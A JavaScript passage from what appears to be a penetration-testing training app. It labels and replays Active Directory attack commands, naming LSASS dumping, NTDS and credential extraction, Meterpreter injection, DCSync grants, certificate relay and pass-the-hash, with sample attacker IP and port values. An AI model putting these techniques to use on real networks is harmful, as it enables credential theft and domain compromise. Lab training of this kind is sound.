        var modNames = {
          spider_plus: 'Spider Readable Shares (-M spider_plus)',
          lsassy: 'Remote LSASS Dump (-M lsassy)',
          nanodump: 'LSASS Nanodump (-M nanodump)',
          backup_operator: 'Backup Operator NTDS Copy (-M backup_operator)',
          'reg-winlogon': 'Winlogon Autologon Pull (-M reg-winlogon)',
          daclread: 'Audit Object DACLs (-M daclread)',
          'group-mem': 'List Group Members (-M group-mem)',
          adcs: 'Find ADCS CAs & Templates (-M adcs)',
          'user-desc': 'Dump User Descriptions (-M user-desc)',
          enum_trusts: 'Enumerate Domain Trusts (-M enum_trusts)',
          pre2k: 'Pre-Win2000 Computer Check (-M pre2k)',
          coerce_plus: 'Coercion Method Sweep (-M coerce_plus)',
          spooler: 'Spooler & WebClient Check (-M spooler)',
          mssql_coerce: 'MSSQL Coercion Check (-M mssql_coerce)',
          mssql_priv: 'MSSQL Privesc Audit (-M mssql_priv)',
          gpp_password: /-u\s+''/.test(run) ? 'Null Session GPP Spider (-M gpp_password)' : 'Authenticated GPP Spider (-M gpp_password)',
          mremoteng: 'Extract mRemoteNG Creds (-M mremoteng)',
          winscp: 'Extract WinSCP Sessions (-M winscp)',
          putty: 'Extract PuTTY Sessions (-M putty)',
          rdcman: 'Extract RDCMan Creds (-M rdcman)',
          iis: 'Extract IIS web.config Creds (-M iis)',
          firefox: 'Decrypt Firefox Logins (-M firefox)',
          powershell_history: 'Dump PS Console History (-M powershell_history)',
          veeam: 'Extract Veeam SQL Creds (-M veeam)',
          keepass_discover: 'Step 1: Find KeePass DBs (-M keepass_discover)',
          keepass_trigger: 'Step 2: Trigger KeePass Export (-M keepass_trigger)',
          met_inject: 'Inject Meterpreter (-M met_inject)',
          laps: 'Read LAPS Passwords (-M laps)',
          gmsa: 'Read gMSA Hashes (-M gmsa)',
          maq: 'Check MachineAccountQuota (-M maq)',
          nopac: 'noPac Vulnerability Check (-M nopac)',
          zerologon: 'ZeroLogon Check (-M zerologon)',
          printnightmare: 'PrintNightmare Check (-M printnightmare)',
          smbghost: 'SMBGhost Check (-M smbghost)',
          'ms17-010': 'EternalBlue Check (-M ms17-010)'
        };
        if (modNames[mods[0]]) return modNames[mods[0]];
        return proto + ' Module: ' + mods.join(' + ');
      }
      if (/--sam\b/.test(run) && /--lsa\b/.test(run)) return proto + ' Dump SAM & LSA Secrets';
      if (/--sam\b/.test(run)) return proto + ' Dump Local SAM (--sam)';
      if (/--lsa\b/.test(run)) return proto + ' Dump LSA Secrets (--lsa)';
      if (/--ntds\b/.test(run)) return proto + ' Dump Domain NTDS.dit (--ntds)';
      if (/--asreproast\b/.test(run)) return /-u\s+\{\{userlist\}\}|-u\s+users\.txt/.test(run) ? 'Unauth Userlist AS-REP Roast (nxc)' : 'Authenticated LDAP AS-REP Roast (nxc)';
      if (/--kerberoasting\b/.test(run)) return 'LDAP Kerberoast All SPNs (nxc)';
      if (/--bloodhound\b/.test(run)) return 'Remote BloodHound Collection (nxc)';
      if (/--rid-brute\b/.test(run) && /--local-groups\b/.test(run)) return 'SMB RID Brute + Local Groups + Policy';
      if (/--rid-brute\b/.test(run)) return /-u\s+''/.test(run) ? 'Null Session RID Brute-Force (nxc)' : 'Authenticated RID Brute-Force (nxc)';
      if (/--shares\b/.test(run) && /-u\s+''/.test(run)) return 'Null Session Share Probe (nxc)';
      if (/--shares\b/.test(run) && /guest/i.test(run)) return 'Guest Session Share Probe (nxc)';
      if (/--shares\b/.test(run)) return 'Authenticated SMB Share Inventory (nxc)';
      if (/--users\b/.test(run) && /awk\b/.test(run)) return 'Handoff: Filter NXC Output to Userlist';
      if (/--users\b/.test(run)) return /-u\s+''/.test(run) ? 'Anonymous LDAP User Dump (nxc)' : 'Authenticated User Dump (nxc --users)';
      if (/--groups\b/.test(run)) return 'Enumerate Domain Groups (nxc --groups)';
      if (/--local-groups\b/.test(run)) return 'Enumerate Local Groups (nxc)';
      if (/--pass-pol\b/.test(run)) return 'Domain Password Policy (nxc --pass-pol)';
      if (/--admin-count\b/.test(run)) return 'Find AdminCount=1 Accounts (nxc)';
      if (/--trusted-for-delegation\b/.test(run)) return 'Find Unconstrained Delegation (nxc)';
      if (/--loggedon-users\b|--sessions\b/.test(run)) return 'Active Sessions & Logged-On Users (nxc)';
      if (/--spider\b/.test(run)) return 'Spider Share for Target File (nxc)';
      if (/--put-file\b/.test(run)) return 'SMB File Upload (nxc --put-file)';
      if (/--get-file\b/.test(run)) return 'SMB File Download (nxc --get-file)';
      if (/--screenshot\b/.test(run)) return proto + ' Desktop Screenshot (nxc)';
      if (/-H\s+\S+/.test(run) && /-[xX]\s+/.test(run)) {
        if (/for\s+\/d|Get-ChildItem/i.test(run)) return proto + ' Locate Flag with NT Hash (-H -x)';
        if (/type\s+/i.test(run)) return proto + ' Read Flag with NT Hash (-H -x)';
        return proto + ' Pass-the-Hash Command Exec (-H -x)';
      }
      if (/-H\s+\S+/.test(run)) return proto + ' Pass-the-Hash Sweep (-H)';
      if (/-[xX]\s+/.test(run)) {
        if (/for\s+\/d|Get-ChildItem/i.test(run)) return proto + ' Remote Flag Locate (-x)';
        if (/type\s+/i.test(run)) return proto + ' Remote Flag Read (-x)';
        return proto + ' Remote Command Exec (' + (/-X\s+/.test(run) ? 'PowerShell -X' : 'cmd -x') + ')';
      }
      if (/-q\s+/.test(run)) return /--local-auth/.test(run) ? 'MSSQL Coerce Auth (Local SQL Login -q)' : 'MSSQL Coerce Auth (Domain Login -q)';
      if (/\{\{userlist\}\}|users\.txt/.test(run)) return proto + ' Multi-User Password Spray';
      if (/-u\s+''/.test(run)) return proto + ' Anonymous / Null Bind Probe';
      return proto + ' Credential Validation Sweep';
    }

    if (/bloodyad/i.test(tool) || /^bloodyAD\b/i.test(run)) {
      if (/get\s+writable/i.test(run)) return 'Find All Writable Objects (bloodyAD)';
      if (/for\s+g\s+in\b/i.test(run)) return 'Bulk Add Self to All Writable Groups';
      if (/add\s+groupMember/i.test(run)) return 'Add User to Group (bloodyAD add groupMember)';
      if (/add\s+dcsync/i.test(run)) return 'Grant DCSync Rights (bloodyAD add dcsync)';
      if (/set\s+owner/i.test(run)) return 'Take Object Ownership (bloodyAD set owner)';
      if (/add\s+genericAll/i.test(run)) return 'Grant Full Control (bloodyAD add genericAll)';
      if (/set\s+password/i.test(run)) return 'Force Password Reset (bloodyAD set password)';
      if (/remove\s+uac/i.test(run)) return 'Re-Enable Disabled Account (remove uac)';
      if (/add\s+shadowCredentials/i.test(run)) return 'Write KeyCredentialLink (bloodyAD)';
      if (/set\s+object\s+.*servicePrincipalName/i.test(run)) return 'Write SPN for Targeted Kerberoast (bloodyAD)';
      if (/set\s+object\s+.*userAccountControl/i.test(run)) return 'Force DONT_REQ_PREAUTH Flag (bloodyAD)';
      if (/add\s+computer/i.test(run)) return 'Create Machine Account (bloodyAD)';
      if (/set\s+rbcd/i.test(run)) return 'Configure RBCD Delegation (bloodyAD)';
    }

    if (/certipy/i.test(tool) || /^certipy\b/i.test(run)) {
      if (/certipy\s+find/i.test(run)) return 'Step 1: Find Vulnerable CAs & Templates (certipy find)';
      if (/certipy\s+auth/i.test(run)) return 'Authenticate with PFX & Extract Hash (certipy auth)';
      if (/certipy\s+shadow/i.test(run)) return 'Shadow Credentials Auto-Chain (certipy shadow)';
      if (/certipy\s+relay/i.test(run)) return 'ESC8: HTTP CA NTLM Relay (certipy relay)';
      if (/certipy\s+account\s+update/i.test(run)) return 'ESC9/10: Modify Victim UPN (certipy account)';
      if (/certipy\s+template/i.test(run)) return /-configuration/.test(run) ? 'ESC4: Restore Original Template ACL' : 'ESC4: Overwrite Template ACL (certipy template)';
      if (/certipy\s+req/i.test(run)) return 'Request Certificate (certipy req)';
    }

    if (note) {
      var mColon = note.match(/^([A-Z0-9][A-Za-z0-9\s\/_.-]{2,42}?(?:\s*\([^)]+\))?)\s*:\s*(.*)$/);
      if (mColon) {
        var h = mColon[1].trim();
        var rest = mColon[2].trim();
        var bare = h.replace(/\s*\([^)]*\)/g, '').trim();
        if (!/^(PREFERRED|OPTIONAL|RECOMMENDED|FALLBACK|ALTERNATIVE|NOTE|TIP|WARNING|HANDOFF|LANE\s+\d+|OPTIONAL ACCELERANT|ON A DC|ON THE HOST|THE PUZZLE|OPENING MOVE)$/i.test(bare)) {
          h = h.replace(/^(PREFERRED|RECOMMENDED|OPTIONAL)\s+/i, '');
          return h.charAt(0).toUpperCase() + h.slice(1);
        } else if (rest) {
          var rClean = rest.split(/\.\s+|;\s+|--/)[0].trim();
          if (rClean.length > 48) rClean = rClean.slice(0, 45).replace(/\s+\S*$/, '') + '...';
          return rClean.charAt(0).toUpperCase() + rClean.slice(1);
        }
      }
      var clean = note
        .replace(/^(PREFERRED|RECOMMENDED|OPTIONAL|FALLBACK|ALTERNATIVE|HANDOFF|LANE\s+\d+)\s*(?:\([^)]*\))?\s*[:,-]?\s*/i, '')
        .split(/\.\s+|;\s+|!\s+|--/)[0]
        .trim();
      if (clean.length > 48) clean = clean.slice(0, 45).replace(/\s+\S*$/, '') + '...';
      if (clean.length >= 4) return clean.charAt(0).toUpperCase() + clean.slice(1);
    }
    return (tool || 'Command') + ' Approach #' + (idx + 1);
  }

  function _disambiguateLabels(commands) {
    var counts = {};
    commands.forEach(function (c) { counts[c.label] = (counts[c.label] || 0) + 1; });
    var seen = {}, used = {};
    commands.forEach(function (c) { if (counts[c.label] === 1) used[c.label] = 1; });
    commands.forEach(function (c, i) {
      if (counts[c.label] > 1) {
        var orig = c.label;
        seen[orig] = (seen[orig] || 0) + 1;
        var qual = c.tool || ('#' + (i + 1));
        if (orig.toLowerCase().indexOf(qual.toLowerCase()) >= 0 || used[orig + ' (' + qual + ')']) {
          var fl = (c.rawRun || c.run || '').match(/\s(--[A-Za-z0-9_-]+|-M\s+\S+|-o\s+\S+|-hashes|-no-pass|-k\b)/);
          qual = fl ? fl[1].trim() : ('Variant ' + seen[orig]);
        }
        var cand = orig + ' (' + qual + ')';
        if (used[cand]) cand = orig + ' (Variant ' + seen[orig] + ')';
        used[cand] = 1;
        c.label = cand;
      }
    });
  }

  // --- the derived conditional cell ------------------------------------------------------------
  function cellFor(moveId, opts) {
    opts = opts || {};
    var m = byId(moveId); if (!m) return null;
    var reqs = reqSet(m), profile = opts.profile || null, entry = laneEntry(moveId) || {};
    var fx = fixtures()[moveId] || null, prod = m.produces || [];
    var hub = STUDY_HUBS[moveId] || null;
    var curated = STUDY_APPROACHES[moveId] || null;
    var commands = [];

    if (curated && curated.length) {
      curated.forEach(function (ap, ai) {
        var apSteps = (ap.steps || []).map(function (st, si) {
          var rawRun = String(st.run || '').trim();
          var dispRun = rawRun.replace(/\{\{(\w+)\}\}/g, '<$1>');
          var sampleCmd = _fillSampleTokens(rawRun);
          var w = st.where === 'host' || ap.locus === 'ON-TARGET' ? 'host' : 'local';
          var stL = cmdLocus({ run: rawRun, tool: st.tool || '', where: w });
          var outLines = st.out ? String(st.out).split('\n') : [];
          return {
            stepNum: si + 1,
            title: st.title || ('Step ' + (si + 1)),
            where: w,
            locus: stL.label,
            prompt: detectPrompt(rawRun, st.tool, w, m.os),
            tool: st.tool || '',
            run: applyProfile(dispRun, st.tool, profile),
            rawRun: rawRun,
            command: sampleCmd,
            outputLines: outLines,
            note: st.note || st.teach || '',
            sig: st.sig || '',
            teach: st.teach || '',
            switches: switchesFor(rawRun, st.tool),
            tokens: tokenizeCmd(dispRun, st.tool)
          };
        });
        var firstSt = apSteps[0] || {};
        var rank = ap.locus === 'ON-TARGET' ? 2 : (ap.locus === 'OFFLINE' ? 1 : 0);
        var tag = ap.locus === 'ON-TARGET' ? 'On-Target · Foothold Shell' : (ap.locus === 'OFFLINE' ? 'Offline · Your Box' : 'Remote · From Your Box');
        if (apSteps.length > 1) tag = (ap.locus === 'ON-TARGET' ? 'On-Target' : 'Remote') + ' Pipeline · ' + apSteps.length + ' Steps';
        var fullChain = apSteps.map(function (s) { return s.run; }).join(' && ');
        commands.push({
          cmdIdx: ai,
          tool: firstSt.tool || 'shell',
          toolsLabel: ap.toolsLabel || firstSt.tool || '',
          label: ap.label || ('Approach ' + (ai + 1)),
          stage: ap.stage || '',
          prereqNote: ap.prereqNote || '',
          when: ap.when || firstSt.note || '',
          deepLink: ap.deepLink || null,
          run: firstSt.run || '',
          rawRun: firstSt.rawRun || '',
          fullChainRun: fullChain,
          note: ap.when || firstSt.note || '',
          locus: ap.locus || 'REMOTE',
          tag: tag,
          rank: rank,
          prompt: firstSt.prompt || 'kali$',
          switches: firstSt.switches || [],
          tokens: firstSt.tokens || [],
          steps: apSteps,
          multi: apSteps.length > 1,
          signal: (apSteps[apSteps.length - 1] && apSteps[apSteps.length - 1].sig) || firstSt.sig || (fx && fx.signal) || '',
          teach: (apSteps[apSteps.length - 1] && apSteps[apSteps.length - 1].teach) || firstSt.teach || ap.when || (fx && fx.teach) || ''
        });
      });
    } else {
      var ranked = (m.commands || []).map(function (c, i) { return { cmd: c, L: cmdLocus(c), i: i }; }).sort(function (a, b) { return a.L.rank - b.L.rank || a.i - b.i; });
      var seenRun = {}, hasLocus = {};
      ranked.forEach(function (o, rIdx) {
        var rawRun = String(o.cmd.run || '').trim();
        if (!rawRun) return;
        var normKey = rawRun.toLowerCase();
        if (seenRun[normKey]) return;
        seenRun[normKey] = 1;
        hasLocus[o.L.label] = true;
        var run = rawRun.replace(/\{\{(\w+)\}\}/g, '<$1>');
        var prompt = detectPrompt(rawRun, o.cmd.tool, o.cmd.where, m.os);
        var label = synthApproachLabel(m, o.cmd, rIdx);
        var entryObj = {
          cmdIdx: o.i,
          tool: o.cmd.tool || '',
          toolsLabel: o.cmd.tool || '',
          label: label,
          stage: o.cmd.stage || '',
          prereqNote: '',
          when: o.cmd.note || '',
          deepLink: null,
          run: applyProfile(run, o.cmd.tool, profile),
          rawRun: rawRun,
          note: o.cmd.note || '',
          locus: o.L.label,
          tag: o.L.tag,
          rank: o.L.rank,
          prompt: prompt,
          switches: switchesFor(rawRun, o.cmd.tool),
          tokens: tokenizeCmd(run, o.cmd.tool)
        };
        // Preserve multi-step fx.steps on the primary command of two-sided moves (e.g. pivot-ligolo)
        if (rIdx === 0 && fx && fx.steps && fx.steps.length > 1) {
          var fxSteps = fx.steps.map(function (s, si) {
            var lines = String(s.output || '').split('\n');
            var scmd = _fillSampleTokens(s.cmd || '');
            if (lines.length && scmd && stripPrompt(lines[0]) === stripPrompt(scmd)) lines = lines.slice(1);
            var w = s.where === 'host' ? 'host' : 'local';
            return {
              stepNum: si + 1,
              title: s.note || ('Step ' + (si + 1) + ' (' + (w === 'host' ? 'On Target' : 'On Kali') + ')'),
              where: w,
              locus: w === 'host' ? 'ON-TARGET' : 'REMOTE',
              prompt: detectPrompt(scmd, s.tool, w, m.os),
              tool: s.tool || o.cmd.tool || '',
              run: scmd,
              rawRun: s.cmd || scmd,
              command: scmd,
              outputLines: lines,
              note: s.note || '',
              sig: fx.signal || '',
              teach: fx.teach || '',
              switches: switchesFor(scmd, s.tool),
              tokens: tokenizeCmd(scmd, s.tool)
            };
          });
          entryObj.steps = fxSteps;
          entryObj.multi = true;
          entryObj.toolsLabel = o.cmd.tool + ' (' + fxSteps.length + '-Step Setup)';
          entryObj.fullChainRun = fxSteps.map(function (s) { return s.run; }).join(' && ');
          entryObj.signal = fx.signal || '';
          entryObj.teach = fx.teach || '';
        }
        commands.push(entryObj);
      });

      // Surface fx.how.items demos when they add a missing locus or when commands.length < 2
      if (fx && fx.how && Array.isArray(fx.how.items)) {
        fx.how.items.forEach(function (it, hi) {
          (it.demo || []).forEach(function (d, di) {
            if (!d || !d.run || String(d.run).trim().charAt(0) === '#') return;
            var dRun = String(d.run).trim();
            var normD = dRun.toLowerCase();
            if (seenRun[normD]) return;
            var dL = cmdLocus({ run: dRun, tool: '' });
            if (!hasLocus[dL.label] || commands.length < 2) {
              seenRun[normD] = 1;
              hasLocus[dL.label] = true;
              var dispRun = dRun.replace(/\{\{(\w+)\}\}/g, '<$1>');
              var firstTok = dRun.split(/\s+/)[0].replace(/^.*[/\\]/, '');
              commands.push({
                cmdIdx: 'how-' + hi + '-' + di,
                tool: firstTok || 'shell',
                toolsLabel: firstTok || 'shell',
                label: it.t || synthApproachLabel(m, { run: dRun, tool: firstTok, note: it.d }, commands.length),
                when: it.d || it.note || '',
                run: dispRun,
                rawRun: dRun,
                note: it.note || it.d || '',
                locus: dL.label,
                tag: dL.tag,
                rank: dL.rank,
                prompt: detectPrompt(dRun, firstTok, '', m.os),
                switches: switchesFor(dRun, firstTok),
                tokens: tokenizeCmd(dispRun, firstTok),
                demoOut: d.out || '',
                demoSig: d.sig || ''
              });
            }
          });
        });
      }
      _disambiguateLabels(commands);
    }

    commands.sort(function (a, b) { return a.rank - b.rank; });

    return {
      id: m.id, title: m.title, phase: entry.phase || '', laneKey: entry.laneKey || '',
      scope: m.scope || '', locus: m.locus || '',
      whatItIs: m.hypothesis || '',
      hub: hub,
      prereqFacts: reqs,
      producedBy: producersOf(reqs).filter(function (x) { return x.id !== m.id; }).map(function (x) { return { id: x.id, title: x.title }; }),
      commands: commands,
      output: buildFixtureOutput(fx),
      proves: prod,
      opens: opensNext(m).map(function (x) { return { id: x.id, title: x.title }; }),
      nextPreviews: nextPreviewFor(moveId),
      blockers: blockersFor(moveId),
      rulesOut: Array.isArray(m.does_not_prove) ? m.does_not_prove.join(' ; ') : (m.does_not_prove || ''),
      refs: m.refs || [],
    };
  }

  function buildFixtureOutput(fx) {
    if (!fx) return null;
    if (fx.steps && fx.steps.length) {
      var text = fx.steps.map(function (s) { return s.output || ''; }).join('\n');
      return { text: text, signal: fx.signal || '', teach: fx.teach || '', cmd: fx.steps[0].cmd || '', tool: fx.steps[0].tool || '', steps: fx.steps };
    }
    if (fx.output) return { text: fx.output, signal: fx.signal || '', teach: fx.teach || '', cmd: fx.cmd || '', tool: fx.tool || '', steps: null };
    return null;
  }

  function stripPrompt(s) { return String(s || '').replace(/^\s*(kali\$|target\$|PS C:\\[^>]*>|C:\\[^>]*>|root@[^\s#]*[#$]|[#$])\s*/, '').trim(); }
  var _ACT_FLAGS = ['--shares', '--rid-brute', '--pass-pol', '--local-groups', '--groups', '--users', '--active-users', '--laps', '--gmsa', '--sam', '--lsa', '--ntds', '--dpapi', '--asreproast', '--kerberoasting', '--bloodhound', '--trusted-for-delegation', '--find-delegation', '--admin-count', '--password-not-required', '--loggedon-users', '--sessions', '--disks', '--computers', '--gen-relay-list', '--spider', '--screenshot', '--nla-screenshot', '--ls', '--sudo-check', '-x', '-X', '-q', '-L', 'enumdomusers', 'querydominfo', 'lookupnames'];
  function _cmdSig(raw) {
    var s = stripPrompt(String(raw || '')).replace(/^\s*(?:sudo|proxychains4?|stdbuf\s+\S+|timeout\s+\S+|\w+=\S+)\s+/i, '').trim();
    var parts = s.split(/\s+/);
    var first = (parts[0] || '').replace(/^.*[/\\]/, '').toLowerCase();
    if ((first === 'python' || first === 'python3' || first === 'perl' || first === 'ruby' || first === 'bash' || first === 'sh') && parts[1]) {
      first = parts[1].replace(/^.*[/\\]/, '').toLowerCase();
    }
    first = first.replace(/^impacket-/, '').replace(/\.(?:py|exe|sh|ps1|pl|rb)$/i, '');
    if (first === 'netexec' || first === 'cme' || first === 'crackmapexec') first = 'nxc';
    var proto = '';
    if (first === 'nxc' && parts[1]) proto = parts[1].toLowerCase();
    var mods = [], mRe = /-M\s+([A-Za-z0-9_.-]+)/g, mm;
    while ((mm = mRe.exec(s)) !== null) mods.push(mm[1].toLowerCase());
    mods.sort();
    var flags = [];
    _ACT_FLAGS.forEach(function (fl) {
      var escFl = fl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      if (new RegExp('(?:^|\\s)' + escFl + '(?:\\s|=|$)', 'i').test(s)) flags.push(fl.toLowerCase());
    });
    flags.sort();
    return { exec: first, proto: proto, mods: mods, flags: flags };
  }
  function _fillSampleTokens(cmd) {
    var map = {
      target: '10.10.10.10', dc_ip: '10.10.10.10', dc_fqdn: 'DC01.acme.internal', hostname: 'DC01',
      domain: 'acme.internal', basedn: 'DC=acme,DC=internal', base_dn: 'DC=acme,DC=internal',
      user: 'jbloggs', username: 'jbloggs', dauser: 'Administrator',
      password: 'Autumn2026!', nthash: '8846f7eaee8fb117ad06bdd830b7586c', dahash: '31d6cfe0d16ae931b73c59d7e0c089c0',
      lhost: '10.10.14.5', attacker_ip: '10.10.14.5', lport: '4444', port: '80', url: 'http://10.10.10.10',
      share: 'Users', userlist: 'users.txt', hashfile: 'hashes.txt', wordlist: '/usr/share/wordlists/rockyou.txt',
      flag_path_local: 'C:\\Users\\jbloggs\\Desktop\\local.txt', flag_path_root: 'C:\\Users\\Administrator\\Desktop\\proof.txt',
      target_sam: 'svc_adm', group: 'Domain Admins', template: 'User'
    };
    return String(cmd || '').replace(/\{\{([a-zA-Z0-9_]+)(?:\|([^}]*))?\}\}/g, function (_, k, defV) {
      return map[k] || defV || ('<' + k + '>');
    });
  }
  function _synthVariantStep(m, cmdIdx, rawCmdObj, targetCmd, fx) {
    var L = cmdLocus(rawCmdObj);
    var where = L.label === 'ON-TARGET' ? 'host' : 'local';
    var sampleCmd = _fillSampleTokens((targetCmd && !/\{\{/.test(targetCmd)) ? targetCmd : (rawCmdObj.run || targetCmd));
    var fn = (OBOL.fieldNote && m) ? OBOL.fieldNote(m, cmdIdx) : null;
    var looks = (fn && fn.look) || [];
    var outLines = [], sig = '', teach = (rawCmdObj && rawCmdObj.note) || (fx && fx.teach) || '';
    if (looks.length) {
      looks.slice(0, 3).forEach(function (lk, i) {
        var idxDash = lk.indexOf(' - ');
        var pat = idxDash > 0 ? lk.slice(0, idxDash).trim() : lk.trim();
        var desc = idxDash > 0 ? lk.slice(idxDash + 3).trim() : '';
        outLines.push(pat);
        if (i === 0) { sig = pat; if (desc) teach = desc; }
      });
    } else if (fx && fx.signal) {
      outLines.push(fx.signal);
      sig = fx.signal;
    }
    return {
      step: { where: where, tool: rawCmdObj.tool || '', command: sampleCmd, outputLines: outLines, note: rawCmdObj.note || '' },
      sig: sig,
      teach: teach
    };
  }
  function replayFor(moveId, cmdIdx, cmdText) {
    var cell = cellFor(moveId); if (!cell) return null;
    var m = byId(moveId), fx = fixtures()[moveId] || null;

    var matchedCmd = null;
    if (cmdIdx !== undefined && cmdIdx !== null) {
      cell.commands.forEach(function (c) { if (String(c.cmdIdx) === String(cmdIdx)) matchedCmd = c; });
    } else if (cell.commands.length && cell.commands[0].steps && cell.commands[0].steps.length) {
      matchedCmd = cell.commands[0];
    }

    if (matchedCmd && matchedCmd.steps && matchedCmd.steps.length) {
      var st0 = matchedCmd.steps[0];
      var allLines = [];
      matchedCmd.steps.forEach(function (st) {
        (st.outputLines || []).forEach(function (l) { allLines.push(l); });
      });
      return {
        id: cell.id, title: cell.title, phase: cell.phase, laneKey: cell.laneKey,
        tool: matchedCmd.tool || st0.tool || '',
        toolsLabel: matchedCmd.toolsLabel || matchedCmd.tool || '',
        label: matchedCmd.label || '',
        when: matchedCmd.when || '',
        prereqNote: matchedCmd.prereqNote || '',
        deepLink: matchedCmd.deepLink || null,
        locus: matchedCmd.locus, tag: matchedCmd.tag, prompt: st0.prompt || matchedCmd.prompt || 'kali$',
        command: st0.command || matchedCmd.run || '',
        fullChainRun: matchedCmd.fullChainRun || st0.command || '',
        note: matchedCmd.note || st0.note || '',
        switches: st0.switches || matchedCmd.switches || [],
        tokens: st0.tokens || matchedCmd.tokens || [],
        steps: matchedCmd.steps,
        multi: matchedCmd.steps.length > 1,
        outputLines: allLines,
        hasOutput: allLines.length > 0,
        signal: matchedCmd.signal || st0.sig || (fx && fx.signal) || '',
        teach: matchedCmd.teach || st0.teach || (fx && fx.teach) || '',
        proves: cell.proves, opens: (cell.opens[0] || {}).title || '', next: laneNext(moveId),
      };
    }

    // Support 'how-...' synthetic locus variants from fx.how.items
    if (typeof cmdIdx === 'string' && cmdIdx.indexOf('how-') === 0) {
      var matchedHow = matchedCmd;
      if (matchedHow) {
        var hCmd = _fillSampleTokens(matchedHow.rawRun || matchedHow.run);
        var hLines = String(matchedHow.demoOut || '').split('\n');
        var hWhere = matchedHow.locus === 'ON-TARGET' ? 'host' : 'local';
        var hPrompt = detectPrompt(hCmd, matchedHow.tool, hWhere, m && m.os);
        var hStep = {
          stepNum: 1,
          title: matchedHow.label || 'Step 1',
          where: hWhere,
          prompt: hPrompt,
          tool: matchedHow.tool || '',
          command: hCmd,
          outputLines: hLines,
          note: matchedHow.note || '',
          sig: matchedHow.demoSig || (fx && fx.signal) || '',
          teach: matchedHow.note || (fx && fx.teach) || '',
          switches: switchesFor(hCmd, matchedHow.tool),
          tokens: tokenizeCmd(hCmd, matchedHow.tool)
        };
        return {
          id: cell.id, title: cell.title, phase: cell.phase, laneKey: cell.laneKey,
          tool: hStep.tool, toolsLabel: matchedHow.toolsLabel || hStep.tool, label: matchedHow.label || '', when: matchedHow.when || '',
          locus: matchedHow.locus, tag: matchedHow.tag, prompt: hPrompt,
          command: hStep.command, note: hStep.note,
          switches: hStep.switches, tokens: hStep.tokens,
          steps: [hStep], multi: false,
          outputLines: hStep.outputLines, hasOutput: hStep.outputLines.length > 0,
          signal: matchedHow.demoSig || (fx && fx.signal) || '',
          teach: matchedHow.note || (fx && fx.teach) || '',
          proves: cell.proves, opens: (cell.opens[0] || {}).title || '', next: laneNext(moveId),
        };
      }
    }

    if (cmdIdx !== undefined && cmdIdx !== null && m && m.commands && m.commands[cmdIdx]) {
      var rawCmdObj = m.commands[cmdIdx];
      var rawRun = rawCmdObj.run || '';
      var tSig = _cmdSig(rawRun);
      var L0 = cmdLocus(rawCmdObj);
      var cands = [];
      if (fx) {
        if (fx.steps && fx.steps.length) {
          fx.steps.forEach(function (s) {
            if (s && s.cmd && s.output) cands.push({ cmd: s.cmd, out: s.output, sig: fx.signal || '', teach: fx.teach || '', where: s.where === 'host' ? 'host' : 'local', tool: s.tool || '' });
          });
        } else if (fx.cmd && fx.output) {
          cands.push({ cmd: fx.cmd, out: fx.output, sig: fx.signal || '', teach: fx.teach || '', where: L0.label === 'ON-TARGET' ? 'host' : 'local', tool: fx.tool || '' });
        }
        if (fx.how && Array.isArray(fx.how.items)) {
          fx.how.items.forEach(function (it) {
            (it.demo || []).forEach(function (d) {
              if (d && d.run && d.out) {
                var dL = cmdLocus({ run: d.run, tool: '' });
                cands.push({ cmd: d.run, out: d.out, sig: d.sig || fx.signal || '', teach: it.note || it.d || fx.teach || '', where: dL.label === 'ON-TARGET' ? 'host' : 'local', tool: rawCmdObj.tool || '' });
              }
            });
          });
        }
      }
      var best = null, bestScore = -1;
      cands.forEach(function (c) {
        var cSig = _cmdSig(c.cmd);
        if (!tSig.exec || tSig.exec !== cSig.exec) return;
        if (tSig.exec === 'nxc' && tSig.proto && cSig.proto && tSig.proto !== cSig.proto) return;
        if (tSig.mods.join(',') !== cSig.mods.join(',')) {
          var sharedMod = tSig.mods.filter(function (x) { return cSig.mods.indexOf(x) >= 0; });
          if (!sharedMod.length) return;
        }
        if (tSig.flags.join(',') !== cSig.flags.join(',')) {
          var sharedFl = tSig.flags.filter(function (x) { return cSig.flags.indexOf(x) >= 0; });
          if ((tSig.flags.length || cSig.flags.length) && !sharedFl.length) return;
        }
        var score = 20;
        tSig.mods.forEach(function (x) { if (cSig.mods.indexOf(x) >= 0) score += 10; });
        tSig.flags.forEach(function (x) { if (cSig.flags.indexOf(x) >= 0) score += 5; });
        if (score > bestScore) { bestScore = score; best = c; }
      });
      var vStep, vSig, vTeach;
      if (best) {
        var bLines = String(best.out || '').split('\n');
        var bCmd = _fillSampleTokens(best.cmd || rawRun);
        if (bLines.length && bCmd && stripPrompt(bLines[0]) === stripPrompt(bCmd)) bLines = bLines.slice(1);
        vStep = { where: L0.label === 'ON-TARGET' ? 'host' : best.where, tool: best.tool || rawCmdObj.tool || '', command: bCmd, outputLines: bLines, note: rawCmdObj.note || '' };
        vSig = best.sig;
        vTeach = best.teach;
      } else {
        var syn = _synthVariantStep(m, cmdIdx, rawCmdObj, cmdText || rawRun, fx);
        vStep = syn.step;
        vSig = syn.sig;
        vTeach = syn.teach;
      }
      vStep.prompt = detectPrompt(vStep.command, vStep.tool, vStep.where, m && m.os);
      vStep.switches = switchesFor(vStep.command, vStep.tool);
      vStep.tokens = tokenizeCmd(vStep.command, vStep.tool);
      vStep.sig = vSig || '';
      vStep.teach = vTeach || '';
      return {
        id: cell.id, title: cell.title, phase: cell.phase, laneKey: cell.laneKey,
        tool: vStep.tool || '',
        toolsLabel: (matchedCmd && matchedCmd.toolsLabel) || vStep.tool || '',
        label: (matchedCmd && matchedCmd.label) || synthApproachLabel(m, rawCmdObj, cmdIdx),
        when: (matchedCmd && matchedCmd.when) || vStep.note || '',
        locus: L0.label, tag: L0.tag, prompt: vStep.prompt,
        command: vStep.command || '', note: vStep.note || '',
        switches: vStep.switches, tokens: vStep.tokens,
        steps: [vStep], multi: false,
        outputLines: vStep.outputLines || [], hasOutput: (vStep.outputLines || []).length > 0,
        signal: vSig || '', teach: vTeach || '',
        proves: cell.proves, opens: (cell.opens[0] || {}).title || '', next: laneNext(moveId),
      };
    }
    var primary = cell.commands[0] || null, out = cell.output;
    var steps = [];
    if (out && out.steps) {
      steps = out.steps.map(function (s) {
        var lines = String(s.output || '').split('\n');
        var cmd = _fillSampleTokens(s.cmd || '');
        if (lines.length && cmd && stripPrompt(lines[0]) === stripPrompt(cmd)) lines = lines.slice(1);
        var w = s.where === 'host' ? 'host' : 'local';
        return {
          where: w,
          prompt: detectPrompt(cmd, s.tool, w, m && m.os),
          tool: s.tool || '',
          command: cmd,
          outputLines: lines,
          note: s.note || '',
